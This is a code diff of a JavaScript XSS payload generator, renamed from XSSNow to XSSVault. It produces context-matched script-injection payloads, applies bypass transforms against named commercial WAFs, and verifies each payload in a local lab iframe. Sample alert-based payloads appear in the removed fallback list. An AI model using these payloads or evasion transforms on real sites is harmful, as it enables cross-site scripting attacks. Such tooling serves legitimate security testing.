@@ -1,681 +1,414 @@
-/* XSSNow - Professional XSS Payload Generator */
+/* XSSVault — Payload Generator */
 
-class XSSPayloadGenerator {
+class Generator {
   constructor() {
-    this.payloadDatabase = [];
-    this.history = JSON.parse(localStorage.getItem('xssnow-history') || '[]');
-    this.currentPayload = null;
+    this.db      = [];
+    this.history = JSON.parse(localStorage.getItem('xssvault-gen-history') || '[]');
+    this.current = [];
+    this.testCache = new Map(); // key: labCtx|code => boolean
+    this.generating = false;
     this.init();
   }
 
-  init() {
-    this.loadPayloadDatabase();
-    this.setupEventListeners();
+  async init() {
+    await this.loadDB();
+    this.setupEvents();
     this.renderHistory();
-    this.setupRestrictionToggle();
   }
 
-  async loadPayloadDatabase() {
+  async loadDB() {
     try {
-      const response = await fetch('data/payloads.yaml');
-      const yamlText = await response.text();
-      const yamlData = jsyaml.load(yamlText) || {};
-      this.payloadDatabase = yamlData.payloads || [];
-    } catch (error) {
-      console.error('Failed to load payload database:', error);
-      this.payloadDatabase = this.getFallbackPayloads();
+      const r    = await fetch('data/payloads.json?v=' + Date.now(), { cache: 'no-cache' });
+      const data = await r.json();
+      this.db = data.payloads || [];
+    } catch (e) {
+      console.error('Failed to load payload DB:', e);
+      this.db = [];
     }
   }
 
-  setupEventListeners() {
-    // Main generate button
-    const generateBtn = document.getElementById('generatePayload');
-    if (generateBtn) {
-      generateBtn.addEventListener('click', () => this.generatePayload());
-    }
+  /* ──────────────────────────────────────────────────────────────
+     GENERATION
+  ────────────────────────────────────────────────────────────── */
+  async generate() {
+    if (this.generating) return;
+    this.generating = true;
 
-    // Action buttons
-    const copyBtn = document.getElementById('copyPayload');
-    if (copyBtn) {
-      copyBtn.addEventListener('click', () => this.copyPayload());
-    }
+    const genBtn = document.getElementById('gen-btn');
+    const refreshBtn = document.getElementById('gen-refresh');
+    if (genBtn) { genBtn.disabled = true; genBtn.textContent = 'Verifying...'; }
+    if (refreshBtn) refreshBtn.disabled = true;
 
-    const saveBtn = document.getElementById('savePayload');
-    if (saveBtn) {
-      saveBtn.addEventListener('click', () => this.savePayload());
-    }
+    const ctx    = document.getElementById('ctx-select')?.value   || 'html';
+    const waf    = document.getElementById('waf-select')?.value   || 'none';
+    const count  = parseInt(document.getElementById('count-select')?.value || '5');
 
-    const refreshBtn = document.getElementById('refreshPayload');
-    if (refreshBtn) {
-      refreshBtn.addEventListener('click', () => this.generatePayload());
-    }
-
-    const exportBtn = document.getElementById('exportPayloads');
-    if (exportBtn) {
-      exportBtn.addEventListener('click', () => this.exportPayloads());
-    }
-  }
-
-  setupRestrictionToggle() {
-    const lengthLimitCheckbox = document.getElementById('lengthLimit');
-    const lengthInputGroup = document.getElementById('lengthInputGroup');
-
-    if (lengthLimitCheckbox && lengthInputGroup) {
-      lengthLimitCheckbox.addEventListener('change', () => {
-        if (lengthLimitCheckbox.checked) {
-          lengthInputGroup.style.display = 'block';
-        } else {
-          lengthInputGroup.style.display = 'none';
-        }
-      });
-    }
-  }
-
-  generatePayload() {
-    const context = document.getElementById('context')?.value || 'html';
-    const waf = document.getElementById('waf')?.value || 'none';
-
-    // Get character restrictions
     const restrictions = {
-      noAngles: document.getElementById('noAngles')?.checked || false,
-      noQuotes: document.getElementById('noQuotes')?.checked || false,
-      noParens: document.getElementById('noParens')?.checked || false,
-      noSlash: document.getElementById('noSlash')?.checked || false,
-      noSemicolon: document.getElementById('noSemicolon')?.checked || false,
-      lengthLimit: document.getElementById('lengthLimit')?.checked || false,
-      maxLength: parseInt(document.getElementById('maxLength')?.value) || 100
+      noAngles : document.getElementById('r-angles')?.checked || false,
+      noQuotes : document.getElementById('r-quotes')?.checked || false,
+      noParens : document.getElementById('r-parens')?.checked || false,
+      noSlash  : document.getElementById('r-slash')?.checked  || false,
+      noSemi   : document.getElementById('r-semi')?.checked   || false,
+      lenLimit : document.getElementById('r-length')?.checked || false,
+      maxLen   : parseInt(document.getElementById('max-length')?.value || '80')
     };
 
-
-    // Filter payloads based on criteria and restrictions
-    let filteredPayloads = this.payloadDatabase.filter(payload => {
-      const contextMatch = this.matchesContext(payload, context);
-      const restrictionMatch = this.passesRestrictions(payload.code, restrictions);
-
-      return contextMatch && restrictionMatch;
-    });
-
-
-    if (filteredPayloads.length === 0) {
-      filteredPayloads = this.getFallbackPayloads().filter(payload =>
-        this.passesRestrictions(payload.code, restrictions)
-      );
-    }
-
-    if (filteredPayloads.length === 0) {
-      this.displayError('No payloads available with these restrictions. Try relaxing some constraints.');
+    const feasibility = this.validateFeasibility(ctx, restrictions);
+    if (!feasibility.ok) {
+      this.renderNoResults(feasibility.msg);
+      this.resetGenerateButtons();
       return;
     }
 
-    // Select 5 random unique payloads
-    const selectedPayloads = this.selectRandomPayloads(filteredPayloads, 5);
-    const generatedPayloads = [];
+    // Filter candidates by context + auto-exec only (generator promises working payloads)
+    let pool = this.db.filter(p => this.matchesContext(p, ctx) && p.auto_exec);
 
-    for (let payload of selectedPayloads) {
-      // Apply transformations
-      let generatedPayload = this.applyWAFBypass(payload.code, waf);
+    // Apply WAF transformation first (mutates code string)
+    pool = pool.map(p => ({ ...p, code: this.applyWAF(p.code, waf), _sourceId: p.id }));
 
-      // Apply restrictions after WAF bypass
-      generatedPayload = this.applyRestrictionBypass(generatedPayload, restrictions);
+    // Filter by restrictions
+    pool = pool.filter(p => this.passesRestrictions(p.code, restrictions));
+    pool = this.uniqueByCode(pool);
 
-      // Final restriction check
-      if (this.passesRestrictions(generatedPayload, restrictions)) {
-        generatedPayloads.push({
-          code: generatedPayload,
-          originalPayload: payload,
-          metadata: {
-            context,
-            waf,
-            restrictions,
-            effectiveness: this.calculateEffectiveness(waf, restrictions),
-            generatedAt: new Date().toISOString()
-          }
-        });
-      }
-    }
-
-    if (generatedPayloads.length === 0) {
-      this.displayError('No payloads passed restrictions. Try relaxing some constraints.');
+    if (pool.length === 0) {
+      this.renderNoResults('No candidates matched these constraints. Try relaxing one restriction.');
+      this.resetGenerateButtons();
       return;
     }
 
-    // Display all generated payloads
-    this.displayMultiplePayloads(generatedPayloads);
-    this.currentPayloads = generatedPayloads;
+    this.renderNoResults(`Verifying ${Math.min(pool.length, 80)} candidates against the lab...`);
+    const verification = await this.selectVerifiedPayloads(pool, ctx, count);
+    const selected = verification.selected;
+    this.current = selected;
 
-    // Auto-add to history
-    this.addToHistory(generatedPayloads);
+    if (!selected.length) {
+      this.renderNoResults('Candidates were found, but none executed in this lab context with current restrictions.');
+      this.resetGenerateButtons();
+      return;
+    }
+
+    this.renderOutput(selected, waf, ctx, restrictions, verification.testedCount);
+    this.addToHistory(selected);
+    this.resetGenerateButtons();
   }
 
-  passesRestrictions(payload, restrictions) {
-    if (restrictions.noAngles && (payload.includes('<') || payload.includes('>'))) {
-      return false;
-    }
-    if (restrictions.noQuotes && (payload.includes('"') || payload.includes("'"))) {
-      return false;
-    }
-    if (restrictions.noParens && (payload.includes('(') || payload.includes(')'))) {
-      return false;
-    }
-    if (restrictions.noSlash && payload.includes('/')) {
-      return false;
-    }
-    if (restrictions.noSemicolon && payload.includes(';')) {
-      return false;
-    }
-    if (restrictions.lengthLimit && payload.length > restrictions.maxLength) {
-      return false;
-    }
+  matchesContext(payload, ctx) {
+    const tags = (payload.tags || []).map(t => String(t).toLowerCase());
+    const contexts = (payload.context || []).map(c => String(c).toLowerCase());
+
+    const byContext = contexts.includes(ctx);
+    if (byContext) return true;
+
+    if (ctx === 'javascript') return tags.some(t => t.includes('js-context') || t.includes('javascript'));
+    if (ctx === 'attribute')  return tags.some(t => t.includes('attribute') || t.includes('autofocus'));
+    if (ctx === 'dom')        return tags.some(t => t.includes('dom') || t.includes('hash'));
+    if (ctx === 'url')        return tags.some(t => t.includes('url') || t.includes('javascript-protocol') || t.includes('data-uri'));
+    if (ctx === 'css')        return tags.some(t => t.includes('css') || t.includes('style'));
+    return false;
+  }
+
+  passesRestrictions(code, r) {
+    if (r.noAngles && (code.includes('<') || code.includes('>')))        return false;
+    if (r.noQuotes && (code.includes('"') || code.includes("'")))        return false;
+    if (r.noParens && (code.includes('(') || code.includes(')')))        return false;
+    if (r.noSlash  && code.includes('/'))                                 return false;
+    if (r.noSemi   && code.includes(';'))                                 return false;
+    if (r.lenLimit && code.length > r.maxLen)                            return false;
     return true;
   }
 
-  applyRestrictionBypass(payload, restrictions) {
-    let modifiedPayload = payload;
-
-    // Apply restriction bypasses
-    if (restrictions.noAngles) {
-      // Use alternative methods without < >
-      modifiedPayload = modifiedPayload
-        .replace(/<script>/gi, 'javascript:')
-        .replace(/<\/script>/gi, '')
-        .replace(/<img[^>]*onerror[^>]*>/gi, 'javascript:alert()')
-        .replace(/<[^>]*on\w+[^>]*>/gi, 'javascript:alert()');
+  validateFeasibility(ctx, r) {
+    const labCtx = this.toLabContext(ctx);
+    if (!labCtx) {
+      return {
+        ok: false,
+        msg: 'This context is not currently executable in the lab auto-validator. Use HTML, JavaScript, Attribute, or DOM.'
+      };
     }
-
-    if (restrictions.noQuotes) {
-      // Replace quotes with alternatives
-      modifiedPayload = modifiedPayload
-        .replace(/"/g, '')
-        .replace(/'/g, '')
-        .replace(/alert\(\s*["']?[^"']*["']?\s*\)/gi, 'alert(document.domain)')
-        .replace(/javascript:\s*["'][^"']*["']/gi, 'javascript:alert(1)');
+    if (ctx === 'javascript' && r.noQuotes) {
+      return {
+        ok: false,
+        msg: 'In this JS-string lab sink, quote characters are required to break out. Disable "No quotes".'
+      };
     }
-
-    if (restrictions.noParens) {
-      // Use alternatives without parentheses
-      modifiedPayload = modifiedPayload
-        .replace(/alert\([^)]*\)/gi, 'alert`1`')
-        .replace(/confirm\([^)]*\)/gi, 'confirm`1`')
-        .replace(/prompt\([^)]*\)/gi, 'prompt`1`')
-        .replace(/eval\([^)]*\)/gi, 'eval`alert\`1\``');
+    if (ctx === 'attribute' && r.noQuotes) {
+      return {
+        ok: false,
+        msg: 'In this attribute lab sink, quote breakout is required. Disable "No quotes".'
+      };
     }
-
-    if (restrictions.noSlash) {
-      // Remove forward slashes
-      modifiedPayload = modifiedPayload
-        .replace(/\/\*/g, '')
-        .replace(/\*\//g, '')
-        .replace(/\/\//g, '')
-        .replace(/<\/script>/gi, '');
-    }
-
-    if (restrictions.noSemicolon) {
-      // Remove semicolons
-      modifiedPayload = modifiedPayload.replace(/;/g, '');
-    }
-
-    return modifiedPayload;
+    return { ok: true, msg: '' };
   }
 
-  matchesContext(payload, context) {
-    const payloadTags = payload.tags || [];
-    const contextMap = {
-      'html': ['html', 'tag', 'element'],
-      'javascript': ['script', 'js', 'javascript'],
-      'css': ['css', 'style'],
-      'url': ['url', 'parameter', 'query'],
-      'attribute': ['attribute', 'attr'],
-      'dom': ['dom', 'javascript'],
-      'json': ['json', 'api'],
-      'xml': ['xml', 'soap']
-    };
-
-    const relevantTags = contextMap[context] || [];
-    return relevantTags.some(tag =>
-      payloadTags.some(payloadTag =>
-        payloadTag.toLowerCase().includes(tag)
-      )
-    ) || payload.code.toLowerCase().includes(context);
+  toLabContext(ctx) {
+    const map = { html: 'reflected', javascript: 'js', attribute: 'attr', dom: 'dom' };
+    return map[ctx] || null;
   }
 
-  matchesDifficulty(payload, difficulty) {
-    const difficultyMap = {
-      'basic': ['basic', 'simple', 'alert'],
-      'moderate': ['bypass', 'filter', 'encode'],
-      'advanced': ['advanced', 'csp', 'complex'],
-      'expert': ['polyglot', 'expert', 'obfuscated']
-    };
-
-    const payloadTags = payload.tags || [];
-    const payloadCategory = payload.category || 'basic';
-
-    return difficultyMap[difficulty].some(tag =>
-      payloadTags.some(payloadTag =>
-        payloadTag.toLowerCase().includes(tag)
-      ) || payloadCategory.toLowerCase().includes(tag)
-    );
+  uniqueByCode(arr) {
+    const seen = new Set();
+    return arr.filter(p => {
+      if (seen.has(p.code)) return false;
+      seen.add(p.code);
+      return true;
+    });
   }
 
-  matchesBrowser(payload, browser) {
-    if (browser === 'all') return true;
+  async selectVerifiedPayloads(pool, ctx, count) {
+    const labCtx = this.toLabContext(ctx);
+    if (!labCtx) return { selected: [], testedCount: 0 };
 
-    const browsers = payload.browsers || ['Chrome', 'Firefox', 'Safari', 'Edge'];
-    return browsers.some(b => b.toLowerCase().includes(browser.toLowerCase()));
+    const candidates = this.shuffle(pool).slice(0, 80);
+    const selected = [];
+    let testedCount = 0;
+
+    for (let i = 0; i < candidates.length && selected.length < count; i++) {
+      const p = candidates[i];
+      const key = `${labCtx}|${p.code}`;
+      let works;
+
+      if (this.testCache.has(key)) {
+        works = this.testCache.get(key);
+      } else {
+        testedCount++;
+        works = await this.runLabVerification(p.code, labCtx, `${Date.now()}-${i}`);
+        this.testCache.set(key, works);
+      }
+
+      if (works) selected.push(p);
+    }
+
+    return { selected, testedCount };
   }
 
-  applyWAFBypass(payload, waf) {
-    const bypasses = {
-      'cloudflare': {
-        'script': 'ſcript',
-        'alert': '\u0061lert',
-        'onerror': 'on\u0065rror',
-        'javascript': 'java\u0073cript'
-      },
-      'aws': {
-        '<script>': '<ſcript>',
-        'javascript:': 'data:text/html,<script>',
-        'eval': 'setTimeout'
-      },
-      'akamai': {
-        'script': 'SCRIPT',
-        'src=': 'src =',
+  runLabVerification(code, ctx, payloadId) {
+    return new Promise(resolve => {
+      const iframe = document.getElementById('gen-test-iframe');
+      if (!iframe) return resolve(false);
+
+      let done = false;
+      const timeoutMs = 1400;
+
+      const finish = ok => {
+        if (done) return;
+        done = true;
+        window.removeEventListener('message', onMessage);
+        clearTimeout(timer);
+        resolve(ok);
+      };
+
+      const onMessage = e => {
+        if (!e || !e.data) return;
+        if (e.data.type === 'xss_fired' && String(e.data.payloadId) === String(payloadId)) {
+          finish(true);
+        }
+      };
+
+      const timer = setTimeout(() => finish(false), timeoutMs);
+      window.addEventListener('message', onMessage);
+      iframe.src = `lab.html?testMode=1&ctx=${encodeURIComponent(ctx)}&payloadId=${encodeURIComponent(payloadId)}&q=${encodeURIComponent(code)}`;
+    });
+  }
+
+  applyWAF(code, waf) {
+    if (waf === 'none') return code;
+
+    const transforms = {
+      cloudflare: {
+        'javascript': 'java\u00ADscript',   // soft hyphen
+        '<script': '<\u0073cript',
         'onerror': 'oN\u0065rror'
       },
-      'modsecurity': {
-        'union': 'uni/**/on',
-        'script': 'scr<>ipt',
-        'alert': 'confirm'
+      aws: {
+        '<script>': '<%00script>',
+        'alert(': 'ale\u0072t(',
+        'onerror': 'onerror\x20'
       },
-      'f5': {
-        '<': '%3C',
-        '>': '%3E',
-        'script': 'ſcript',
-        'javascript': 'data:text/html,'
+      akamai: {
+        'script': 'SCRIPT',
+        'onerror': 'oN\u0065rror',
+        'src=': 'src\x20='
+      },
+      modsecurity: {
+        'alert(': 'confirm(',
+        '<script': '<\u0073cript',
+        'onerror': 'on\u0065rror'
+      },
+      f5: {
+        'alert(': 'alert\u200B(',
+        '<script': '<\u0073cript',
+        'javascript:': 'java\u00ADscript:'
       }
     };
 
-    if (waf === 'none' || !bypasses[waf]) return payload;
+    const rules = transforms[waf];
+    if (!rules) return code;
 
-    let modifiedPayload = payload;
-    const wafBypasses = bypasses[waf];
-
-    for (const [original, replacement] of Object.entries(wafBypasses)) {
-      modifiedPayload = modifiedPayload.replace(new RegExp(original, 'gi'), replacement);
+    let out = code;
+    for (const [from, to] of Object.entries(rules)) {
+      out = out.replace(new RegExp(from.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi'), to);
     }
-
-    return modifiedPayload;
+    return out;
   }
 
-  applyEncoding(payload, encoding) {
-    switch (encoding) {
-      case 'url':
-        return encodeURIComponent(payload);
-      case 'html':
-        return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-      case 'unicode':
-        return payload.split('').map(char =>
-          char.charCodeAt(0) > 127 ? `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}` : char
-        ).join('');
-      case 'base64':
-        return btoa(payload);
-      case 'hex':
-        return payload.split('').map(char =>
-          '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0')
-        ).join('');
-      default:
-        return payload;
+  shuffle(arr) {
+    const a = [...arr];
+    for (let i = a.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [a[i], a[j]] = [a[j], a[i]];
     }
+    return a;
   }
 
-  selectRandomPayloads(payloads, count) {
-    if (payloads.length <= count) {
-      return payloads;
-    }
-
-    const shuffled = [...payloads].sort(() => 0.5 - Math.random());
-    return shuffled.slice(0, count);
+  calcEffectiveness(waf, r) {
+    let score = 92;
+    const wafPenalty = { none: 0, cloudflare: -10, aws: -8, akamai: -12, modsecurity: -14, f5: -9 };
+    score += wafPenalty[waf] || 0;
+    if (r.noAngles) score -= 14;
+    if (r.noQuotes) score -= 9;
+    if (r.noParens) score -= 8;
+    if (r.noSlash)  score -= 5;
+    if (r.noSemi)   score -= 3;
+    if (r.lenLimit) score -= 8;
+    return Math.max(25, Math.min(98, score));
   }
 
-  calculateEffectiveness(waf, restrictions) {
-    const baseEffectiveness = 90;
-
-    const wafPenalty = {
-      'none': 0,
-      'cloudflare': -10,
-      'aws': -8,
-      'akamai': -12,
-      'modsecurity': -15,
-      'f5': -10
+  /* ──────────────────────────────────────────────────────────────
+     RENDERING
+  ────────────────────────────────────────────────────────────── */
+  renderOutput(payloads, waf, ctx, r, testedCount) {
+    const wafLabels = {
+      none: 'No WAF', cloudflare: 'Cloudflare', aws: 'AWS WAF',
+      akamai: 'Akamai', modsecurity: 'ModSecurity', f5: 'F5 ASM'
     };
+    const eff = this.calcEffectiveness(waf, r);
+    const effCls = eff >= 70 ? 'eff-high' : eff >= 50 ? 'eff-medium' : 'eff-low';
 
-    // Penalty for restrictions
-    let restrictionPenalty = 0;
-    if (restrictions.noAngles) restrictionPenalty -= 15;
-    if (restrictions.noQuotes) restrictionPenalty -= 10;
-    if (restrictions.noParens) restrictionPenalty -= 8;
-    if (restrictions.noSlash) restrictionPenalty -= 5;
-    if (restrictions.noSemicolon) restrictionPenalty -= 3;
-    if (restrictions.lengthLimit) restrictionPenalty -= 10;
-
-    return Math.max(30, baseEffectiveness + wafPenalty[waf] + restrictionPenalty);
-  }
-
-  displayMultiplePayloads(payloads) {
-    const outputElement = document.getElementById('payloadOutput');
-    if (!outputElement) return;
-
-    const payloadCards = payloads.map((payload, index) => {
-      const effectiveness = payload.metadata.effectiveness;
-      const effectivenessClass = effectiveness > 70 ? 'high' : effectiveness > 50 ? 'medium' : 'low';
-
-      const bypassTypes = {
-        'none': 'Standard',
-        'cloudflare': 'Cloudflare Bypass',
-        'aws': 'AWS WAF Bypass',
-        'akamai': 'Akamai Bypass',
-        'modsecurity': 'ModSecurity Bypass',
-        'f5': 'F5 ASM Bypass'
-      };
-
-      return `
-        <div class="payload-card">
-          <div class="payload-header">
-            <h4 class="payload-title">${this.escapeHtml(payload.originalPayload.category || 'XSS')} Payload #${index + 1}</h4>
-            <div class="payload-actions">
-              <button data-action="copy" data-payload-index="${index}" title="Copy">
-                <i class="fas fa-copy"></i>
-              </button>
-              <button data-action="save" data-payload-index="${index}" title="Save">
-                <i class="fas fa-save"></i>
-              </button>
-            </div>
-          </div>
-          <div class="payload-code">
-            <code>${this.escapeHtml(payload.code)}</code>
-          </div>
-          <div class="payload-meta">
-            <div class="meta-item">
-              <span class="meta-label">Effectiveness</span>
-              <span class="meta-value ${effectivenessClass}">${effectiveness}%</span>
-            </div>
-            <div class="meta-item">
-              <span class="meta-label">Context</span>
-              <span class="meta-value">${this.escapeHtml(payload.metadata.context)}</span>
-            </div>
-            <div class="meta-item">
-              <span class="meta-label">Bypass Type</span>
-              <span class="meta-value">${this.escapeHtml(bypassTypes[payload.metadata.waf] || 'Custom')}</span>
-            </div>
-            <div class="meta-item">
-              <span class="meta-label">Length</span>
-              <span class="meta-value ${payload.metadata.restrictions.lengthLimit && payload.code.length <= payload.metadata.restrictions.maxLength ? 'high' : ''}">${payload.code.length} chars</span>
-            </div>
-            <div class="meta-item">
-              <span class="meta-label">Description</span>
-              <span class="meta-value">${this.escapeHtml(payload.originalPayload.description || 'XSS payload')}</span>
-            </div>
+    const html = payloads.map((p, i) => `
+      <div class="gen-result-card">
+        <div class="gen-result-head">
+          <span class="gen-result-label">${this.esc(p.category)} — ${this.esc(p.description || 'XSS payload')}</span>
+          <div class="gen-result-actions">
+            <button class="gen-copy-btn" data-gi="${i}" title="Copy">📋 Copy</button>
+            <a class="gen-copy-btn" href="lab.html?q=${encodeURIComponent(p.code)}" target="_blank" title="Test in Lab">🧪 Test</a>
           </div>
         </div>
-      `;
-    }).join('');
+        <div class="gen-result-code">${this.esc(p.code)}</div>
+        <div class="gen-result-foot">
+          <div class="effectiveness-bar" title="Estimated effectiveness: ${eff}%">
+            <div class="effectiveness-fill ${effCls}" style="width:${eff}%"></div>
+          </div>
+          <div class="eff-label">${eff}% effective</div>
+          <span class="meta-pill" style="margin-left:8px;">${this.esc(wafLabels[waf] || waf)}</span>
+          <span class="meta-pill">${p.code.length}c</span>
+          <span class="meta-pill">lab-verified</span>
+        </div>
+      </div>`).join('');
 
-    outputElement.innerHTML = payloadCards;
-    this.setupPayloadCardEventListeners();
+    document.getElementById('gen-output').innerHTML = `
+      <div style="font-size:0.75rem;color:var(--green);margin-bottom:10px;">Generated from verified payloads${testedCount ? ` (${testedCount} candidates tested)` : ''}.</div>
+      ${html}
+    `;
+    this.attachCopyEvents();
   }
 
-  setupPayloadCardEventListeners() {
-    const payloadButtons = document.querySelectorAll('[data-action]');
-    payloadButtons.forEach(button => {
-      button.addEventListener('click', (e) => {
-        const action = e.currentTarget.dataset.action;
-        const index = parseInt(e.currentTarget.dataset.payloadIndex);
-
-        if (action === 'copy' && this.currentPayloads && this.currentPayloads[index]) {
-          this.copyPayloadItem(this.currentPayloads[index].code);
-        } else if (action === 'save' && this.currentPayloads && this.currentPayloads[index]) {
-          this.savePayloadItem(index);
-        }
-      });
-    });
-  }
-
-  displayError(message) {
-    const outputElement = document.getElementById('payloadOutput');
-    if (outputElement) {
-      outputElement.innerHTML = `<div style="color: #ff4444; text-align: center; padding: 2rem;">
-        <i class="fas fa-exclamation-triangle"></i><br>
-        ${this.escapeHtml(message)}
+  renderNoResults(msg) {
+    document.getElementById('gen-output').innerHTML = `
+      <div class="gen-placeholder">
+        <div class="gen-placeholder-icon">⚠️</div>
+        ${this.esc(msg)}
       </div>`;
-    }
   }
 
-  copyPayloadItem(payload) {
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(payload).then(() => {
-      }).catch(err => {
-        console.error('Failed to copy payload:', err);
-        this.fallbackCopyText(payload);
+  resetGenerateButtons() {
+    this.generating = false;
+    const genBtn = document.getElementById('gen-btn');
+    const refreshBtn = document.getElementById('gen-refresh');
+    if (genBtn) { genBtn.disabled = false; genBtn.textContent = '⚡ Generate Payloads'; }
+    if (refreshBtn) refreshBtn.disabled = false;
+  }
+
+  attachCopyEvents() {
+    document.querySelectorAll('.gen-copy-btn[data-gi]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const idx     = parseInt(btn.dataset.gi);
+        const payload = this.current[idx];
+        if (!payload) return;
+        navigator.clipboard?.writeText(payload.code).then(() => {
+          const orig = btn.textContent;
+          btn.textContent = '✓ Copied';
+          btn.classList.add('copied');
+          setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 1400);
+        });
       });
-    } else {
-      this.fallbackCopyText(payload);
-    }
-  }
-
-  savePayloadItem(index) {
-    if (!this.currentPayloads || !this.currentPayloads[index]) return;
-
-    const payload = this.currentPayloads[index];
-    this.history.unshift({
-      code: payload.code,
-      metadata: payload.metadata,
-      id: Date.now(),
-      savedAt: new Date().toISOString()
     });
-
-    // Keep only last 50 entries
-    this.history = this.history.slice(0, 50);
-
-    localStorage.setItem('xssnow-history', JSON.stringify(this.history));
-    this.renderHistory();
-
-    console.log('Payload saved to history');
   }
 
-  escapeForJs(str) {
-    return str.replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n');
-  }
-
+  /* ──────────────────────────────────────────────────────────────
+     HISTORY
+  ────────────────────────────────────────────────────────────── */
   addToHistory(payloads) {
-    const timestamp = new Date().toISOString();
-    payloads.forEach(payload => {
-      this.history.unshift({
-        code: payload.code,
-        metadata: payload.metadata,
-        id: Date.now() + Math.random(),
-        savedAt: timestamp
-      });
+    payloads.forEach(p => {
+      this.history.unshift({ code: p.code, cat: p.category, ts: Date.now() });
     });
-
-    // Keep only last 50 entries
-    this.history = this.history.slice(0, 50);
-    localStorage.setItem('xssnow-history', JSON.stringify(this.history));
+    this.history = this.history.slice(0, 20);
+    localStorage.setItem('xssvault-gen-history', JSON.stringify(this.history));
     this.renderHistory();
-  }
-
-  exportPayloads() {
-    if (!this.currentPayloads || this.currentPayloads.length === 0) {
-      alert('No payloads to export. Generate some payloads first.');
-      return;
-    }
-
-    const payloadLines = this.currentPayloads
-      .map(payload => payload.code.trim())
-      .filter(code => code.length > 0)
-      .join('\n');
-
-    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-    const filename = `xssnow-payloads-${timestamp}.txt`;
-
-    const blob = new Blob([payloadLines], { type: 'text/plain' });
-    const url = window.URL.createObjectURL(blob);
-
-    const a = document.createElement('a');
-    a.style.display = 'none';
-    a.href = url;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    window.URL.revokeObjectURL(url);
-    document.body.removeChild(a);
-
-    console.log(`Exported ${this.currentPayloads.length} payloads to ${filename}`);
   }
 
   renderHistory() {
-    const historyElement = document.getElementById('payloadHistory');
-    if (!historyElement) return;
-
+    const el = document.getElementById('gen-history-list');
+    if (!el) return;
     if (this.history.length === 0) {
-      historyElement.innerHTML = `
-        <div class="empty-history">
-          <i class="fas fa-history"></i>
-          <p>Your generated payloads will appear here</p>
-        </div>
-      `;
+      el.innerHTML = '<div style="font-size:0.8rem;color:var(--text3);text-align:center;padding:20px;">No history yet</div>';
       return;
     }
-
-    historyElement.innerHTML = this.history.slice(0, 10).map((item, index) => `
+    el.innerHTML = this.history.map((h, i) => `
       <div class="history-item">
-        <div class="history-payload">
-          <code>${this.escapeHtml(item.code)}</code>
-        </div>
-        <div class="history-meta">
-          <span class="history-context">${this.escapeHtml(item.metadata.context)}</span>
-          <span class="history-waf">${this.escapeHtml(item.metadata.waf)}</span>
-          <span class="history-date">${new Date(item.savedAt).toLocaleDateString()}</span>
-        </div>
-        <div class="history-actions">
-          <button data-action="copy-history" data-history-index="${index}" title="Copy">
-            <i class="fas fa-copy"></i>
-          </button>
-        </div>
-      </div>
-    `).join('');
+        <code>${this.esc(h.code)}</code>
+        <span class="h-meta">${this.esc(h.cat)}</span>
+        <button class="history-copy" data-hi="${i}" title="Copy">📋</button>
+      </div>`).join('');
 
-    this.setupHistoryEventListeners();
-  }
-
-  setupHistoryEventListeners() {
-    const historyButtons = document.querySelectorAll('[data-action="copy-history"]');
-    historyButtons.forEach(button => {
-      button.addEventListener('click', (e) => {
-        const index = parseInt(e.currentTarget.dataset.historyIndex);
-        if (this.history && this.history[index]) {
-          this.copyHistoryItem(this.history[index].code);
-        }
+    el.querySelectorAll('.history-copy').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const h = this.history[parseInt(btn.dataset.hi)];
+        if (h) navigator.clipboard?.writeText(h.code).then(() => {
+          btn.textContent = '✓'; setTimeout(() => { btn.textContent = '📋'; }, 1200);
+        });
       });
     });
   }
 
-  copyHistoryItem(payload) {
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(payload).then(() => {
-        console.log('Payload copied from history');
-      }).catch(err => {
-        console.error('Failed to copy from history:', err);
-        this.fallbackCopyText(payload);
+  /* ──────────────────────────────────────────────────────────────
+     EVENTS
+  ────────────────────────────────────────────────────────────── */
+  setupEvents() {
+    document.getElementById('gen-btn')?.addEventListener('click', () => this.generate());
+    document.getElementById('gen-refresh')?.addEventListener('click', () => this.generate());
+
+    document.getElementById('r-length')?.addEventListener('change', e => {
+      document.getElementById('length-group').style.display = e.target.checked ? 'block' : 'none';
+    });
+
+    document.getElementById('gen-export')?.addEventListener('click', () => {
+      if (!this.current.length) { alert('Generate payloads first.'); return; }
+      const text = this.current.map(p => p.code).join('\n');
+      const blob = new Blob([text], { type: 'text/plain' });
+      const url  = URL.createObjectURL(blob);
+      const a    = Object.assign(document.createElement('a'), {
+        href: url, download: `xssvault-generated-${Date.now()}.txt`, style: 'display:none'
       });
-    } else {
-      this.fallbackCopyText(payload);
-    }
+      document.body.appendChild(a); a.click();
+      URL.revokeObjectURL(url); document.body.removeChild(a);
+    });
   }
 
-  fallbackCopyText(text) {
-    const textArea = document.createElement('textarea');
-    textArea.value = text;
-    textArea.style.position = 'fixed';
-    textArea.style.left = '-999999px';
-    textArea.style.top = '-999999px';
-    document.body.appendChild(textArea);
-    textArea.focus();
-    textArea.select();
-
-    try {
-      document.execCommand('copy');
-      console.log('Text copied using fallback method');
-    } catch (err) {
-      console.error('Fallback copy failed:', err);
-    } finally {
-      document.body.removeChild(textArea);
-    }
-  }
-
-  escapeHtml(text) {
-    return text
-      .replace(/&/g, '&amp;')
-      .replace(/</g, '&lt;')
-      .replace(/>/g, '&gt;')
-      .replace(/"/g, '&quot;')
-      .replace(/'/g, '&#x27;')
-      .replace(/\//g, '&#x2F;');
-  }
-
-  getFallbackPayloads() {
-    return [
-      {
-        code: '<script>alert("XSS")</script>',
-        category: 'basic',
-        tags: ['basic', 'script', 'alert'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      },
-      {
-        code: '<img src=x onerror=alert("XSS")>',
-        category: 'basic',
-        tags: ['basic', 'img', 'onerror'],
-        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
-      },
